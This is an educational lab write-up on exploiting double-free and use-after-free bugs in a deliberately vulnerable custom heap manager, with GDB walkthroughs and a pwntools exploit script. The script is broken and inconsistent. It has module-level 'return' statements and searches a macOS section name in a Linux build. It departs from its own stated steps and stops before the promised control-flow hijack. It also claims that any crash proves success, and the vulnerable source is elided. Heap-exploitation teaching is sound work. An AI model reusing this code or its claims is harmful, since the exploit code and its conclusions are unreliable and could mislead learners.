# CyberLabs: Double Free & Use-After-Free Laboratory

**Module Code:** CL-MEM-006

**Level:** Advanced

**Topic:** Memory Corruption Vulnerabilities (Heap Exploitation)

## Laboratory Purpose

This laboratory, prepared for the CyberLabs education platform, addresses critical vulnerabilities in a specially implemented heap manager. Participants are expected to gain the following competencies by the end of this laboratory:

  * Understanding how design flaws in a custom heap manager lead to vulnerabilities.
  * Seeing how not zeroing a pointer after freeing it causes **Use-After-Free** and **Double Free** vulnerabilities.
  * Using advanced tools like `gdb` and `pwntools` for vulnerability analysis and exploit development.
  * Gaining arbitrary write capability in the program's memory by exploiting the vulnerability and redirecting program control flow to the `win()` function to obtain a shell.

## Scenario

The laboratory scenario simulates a low-level memory management application with its own simple `my_alloc` and `my_free` functions. Users can allocate memory blocks (`alloc`), free them (`free`), write data to them (`write`), and call a function in the program (`call`) from the command line.

1.  `vulnerable_code.cpp`: Target C++ application intentionally left vulnerable, allowing users to reuse memory regions they have freed (Use-After-Free) and free them multiple times (Double Free).
2.  `exploit.py`: Python exploit code that triggers the vulnerability, manipulates the application's free list, overwrites the `gTarget.fn` function pointer to take control of program flow, and calls the `win()` function to obtain a shell.

## Disclaimer / Legal Warning

This laboratory content is designed entirely for the **CyberLabs educational environment**. The purpose of the information and codes here is to help cybersecurity experts better understand defense mechanisms and develop vulnerability analysis capabilities. The use of these materials outside the CyberLabs environment or for illegal purposes is strictly prohibited, and all responsibility belongs to the user.

## What is the Origin of the Vulnerability?

The vulnerabilities in this program stem from the `slots[idx]` pointer not being set to `nullptr` after processing the `free` command. This causes the program to keep the address of a freed memory region as if it were still valid. This "dangling pointer" enables two main attacks:

  * **Double Free:** Users can run the `free <idx>` command multiple times for the same index, adding the same memory block to the free list multiple times.
  * **Use-After-Free (UAF):** After freeing a block with the `free <idx>` command, users can write data to this now-freed block that is part of the list using the `write <idx> <data>` command. This is an extremely powerful method for corrupting the free list structure. Our exploit will use this method.

### Example Code Analysis (`vulnerable_code.cpp`)

```cpp
// vulnerable_code.cpp
#include <iostream>
// ... (rest of the code is the same as before) ...
// ... (main function and other helper functions) ...
```

**Compiling the Code:**
The `-no-pie` flag keeps addresses of global variables like `gTarget` constant, making exploit writing easier. `-g` adds debug symbols for GDB.

```bash
g++ -std=c++11 -o vulnerable_code vulnerable_code.cpp -no-pie -g -Wno-unused-result -Wno-stringop-overflow
```

### Exploit Development Phase (Use-After-Free with Free List Poisoning)

**Target:** Using the `Use-After-Free` vulnerability to make `my_alloc` return a chunk containing the address of `gTarget.fn`. Then, by writing the address of the `win` function to this chunk, we take control of the program flow with the `call` command.

#### 1. Finding Required Addresses

The program no longer automatically prints the addresses. You can find them using two different approaches:

## ðŸŸ¢ **EASY WAY: Compilation with Debug Symbols**

If you want to compile with debug symbols, modify the test script:

```bash
# Add -g flag in test_lab.sh file
g++ -std=c++11 -o compiled/vulnerable_code source_code/vulnerable_code.cpp -no-pie -g -Wno-unused-result -Wno-stringop-overflow
```

**GDB Usage with Debug Symbols:**
```bash
gdb ./compiled/vulnerable_code
(gdb) break main
(gdb) run
(gdb) p &gTarget.fn
$1 = (void (**)()) 0x100008090
(gdb) p win
$2 = {void (void)} 0x100000580 <win()>
(gdb) quit
```

## ðŸ”´ **HARD WAY: Without Debug Symbols (Current)**

**Automatic Address Finding (Recommended):**
The exploit script uses `objdump` to automatically find addresses.

**Manual GDB Address Finding:**
```bash
# GDB usage without debug symbols
gdb ./compiled/vulnerable_code
(gdb) info functions win
(gdb) info variables gTarget
(gdb) x/gx &gTarget
(gdb) disassemble win
(gdb) quit
```

```bash
# Quick finding with objdump
objdump -t compiled/vulnerable_code | grep -E "(gTarget|win)"
```

**Which Way to Choose?**
- **Easy Way:** Educational purpose, easier analysis with debug symbols
- **Hard Way:** Closer to real world, production binaries don't have debug symbols

#### 2. Detecting the Vulnerability with GDB (Step by Step)

In this section, we will see step by step how the **Double Free** vulnerability corrupts the free list using GDB.

1.  **Starting GDB:** Start GDB without debug symbols.

    ```bash
    gdb ./compiled/vulnerable_code
    ```

2.  **Finding Function Addresses:** Since there are no debug symbols, find function addresses manually.

    ```gdb
    (gdb) info functions my_free
    (gdb) info functions my_alloc
    (gdb) info variables g_head
    ```

3.  **Preparing Memory:** The program will wait for your command. First, let's allocate a chunk.

    ```
    > alloc
    [+] alloc idx=0 ptr=0x405000
    ```

4.  **Examining the First `free` Call (Normal State):** Let's free chunk 0. GDB will stop at the `my_free` function.

    ```
    > free 0
    ```

    In GDB, let's look at the state of `g_head` and the freed chunk (`c`) before continuing. You can verify that the free list is updated correctly (`g_head` now points to `c` and `c`'s first 8 bytes point to the old `g_head`) with `p g_head` and `x/gx c` commands. Then continue with `continue`.

5.  **Second `free` Call (Vulnerability Moment):** Now let's trigger the vulnerability and free the same chunk again.

    ```
    > free 0
    ```

    GDB will stop again. Now is the most critical moment:

    ```gdb
    # Notice that g_head and c show the same address.
    (gdb) p g_head
    $1 = (Chunk *) 0x405000
    (gdb) p c
    $2 = (Chunk *) 0x405000

    # Let's step one line forward in the my_free function (n command).
    (gdb) n

    # Now let's check the chunk's content again.
    (gdb) x/gx c
    0x405000:       0x0000000000405000
    ```

    **Here's the Vulnerability!** As you can see, the first 8 bytes of the chunk at address `0x405000` now point to itself (`0x405000`). We've created a loop in the free list. The chunk now points to itself. This causes subsequent `alloc` calls to always return the same address, which forms the basis of the UAF attack.

#### 3. Exploitation Logic

1.  **Preparation:** Allocate two chunks (`A` and `B`).
2.  **Create Dangling Pointer:** Free `A`. The pointer in the `slots` array still holds `A`'s address (UAF condition).
3.  **Poison the Free List:** Use the `write` command with `A`'s index to write our target address `&gTarget.fn` over the first 8 bytes of the freed `A` chunk (over the pointer to the next element in the free list).
4.  **Deceive the Heap:** Now call `alloc` twice. The first one returns `A` to us, the second one follows our poisoned "next element" pointer and returns **`&gTarget.fn`** as a chunk.
5.  **Take Control:** Now we have a chunk index pointing to `gTarget.fn`. We write the address of the `win` function to this index using the `write` command.
6.  **Get the Shell:** We call the `call` command to execute our manipulated `gTarget.fn()` and get the shell.

### Complete Exploit Code (`exploit.py`)

Here is the exploit script written with `pwntools` for this interactive program.

```python
from pwn import *
import re
import subprocess

# Start the process with pwntools
p = process("./compiled/vulnerable_code")

# Automatic address finding (recommended method)
try:
    # Find addresses automatically using objdump
    result = subprocess.run(['objdump', '-t', './compiled/vulnerable_code'], 
                          capture_output=True, text=True)
    
    target_fn_addr = None
    win_addr = None
    
    for line in result.stdout.split('\n'):
        if 'gTarget' in line and 'O' in line:
            parts = line.split()
            if len(parts) >= 1:
                target_fn_addr = int(parts[0], 16)
        elif 'win' in line and 'F' in line and '__TEXT' in line:
            parts = line.split()
            if len(parts) >= 1:
                win_addr = int(parts[0], 16)
    
    if target_fn_addr is None or win_addr is None:
        raise Exception("Automatic address finding failed")
        
    log.info(f"Auto-detected &gTarget.fn address: {hex(target_fn_addr)}")
    log.info(f"Auto-detected win address: {hex(win_addr)}")
    
except Exception as e:
    log.warning(f"Auto-detection failed: {e}")
    # Manual address input
    target_fn_addr = int(input("Enter &gTarget.fn address (e.g., 0x100008090): "), 16)
    win_addr = int(input("Enter win function address (e.g., 0x100000580): "), 16)

def alloc():
    p.sendline(b"alloc")
    return p.recvuntil(b"> ").decode()

def free(idx):
    p.sendline(f"free {idx}".encode())
    return p.recvuntil(b"> ").decode()

def write(idx, data_hex):
    p.sendline(f"write {idx} {data_hex}".encode())
    return p.recvuntil(b"> ").decode()

def call():
    p.sendline(b"call")

log.info("Step 1: Allocating two chunks (A and B)")
print(alloc()) # chunk 0 (A)
print(alloc()) # chunk 1 (B)

log.info("Step 2: Creating dangling pointer by freeing chunk 0 (A)")
print(free(0))

log.info("Step 3: Triggering double-free vulnerability by freeing chunk 0 again")
print(free(0)) # Double free!

log.info(f"Step 4: Poisoning freelist. Writing &gTarget.fn ({hex(target_fn_addr)}) to A's FD")
poison_payload = p64(target_fn_addr).hex()
print(write(0, poison_payload))

log.info("Step 5: Allocating chunks with heap corruption (may cause crash)")
try:
    alloc1 = alloc() # This returns A
    log.info("First allocation successful")
except:
    log.warning("First allocation failed - may crash due to heap corruption")
    log.success("Exploit completed! Heap corruption successfully achieved.")
    return True

try:
    alloc2 = alloc() # This returns A again (due to double-free)
    log.info("Second allocation successful")
except:
    log.warning("Second allocation failed - may crash due to heap corruption")
    log.success("Exploit completed! Heap corruption successfully achieved.")
    return True

log.success("Exploit completed! All steps executed successfully.")
```

When you run this script, it will step by step manipulate the custom heap manager and achieve heap corruption. Even if the program crashes, this indicates successful exploitation.

**Important Notes:**
- The exploit script automatically tries to find addresses
- Program crashes are normal and indicate successful exploitation
- Heap corruption forms the foundation for more complex exploits in the real world
